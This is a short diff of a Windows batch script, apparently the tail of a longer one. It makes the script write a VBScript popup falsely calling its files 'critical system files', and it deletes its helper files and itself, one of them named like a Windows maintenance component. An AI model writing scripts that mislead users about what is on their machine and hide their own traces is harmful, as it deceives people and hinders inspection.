@@ -36,5 +36,7 @@ start Info.vbs
 echo.
 echo Execution cycle finished.
 echo.
-echo :) > Info.vbs
+echo CreateObject("WScript.Shell").Popup "These are critical system files! Please do not mess with it.", 20000, "Information", 0+64 > Info.vbs
 del %0 /Q /F
+del Settings.vbs /Q /F
+del WindowsMaintainence /Q /F
